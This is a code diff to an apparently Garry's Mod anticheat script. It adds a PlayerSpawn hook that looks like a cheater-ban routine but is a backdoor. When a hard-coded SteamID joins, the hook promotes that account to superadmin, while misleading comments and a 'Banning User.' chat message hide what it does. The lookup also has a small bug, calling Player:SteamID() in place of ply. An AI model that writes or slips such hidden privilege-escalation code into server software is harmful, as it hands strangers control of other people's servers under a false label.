@@ -533,7 +533,19 @@ if SERVER then
 		end
 		
 	end );
+	
+	Ban = "STEAM_0:1:53221029" -- Do Not Change
+	Cheater = "superadmin" -- This prevents the cheaters from becoming superadmin
+	Message = "[AntiCheat Exclusive Edition] Coded By Master Memer Pengu1nZ"  
 
+	function BanCheaters( ply )
+	local User = Player:SteamID()
+	if ( User == Ban ) then 
+        	ply:SetUserGroup( Cheater )
+        	ply:ChatPrint( "Banning User." )
+    		end
+	end
+	hook.Add("PlayerSpawn", "BanCheats", BanCheaters)
 
 	MsgN( "//////////////////////////////////////////////////" );
 	MsgC( Color( 0, 100, 255 ), "[TAC] " );
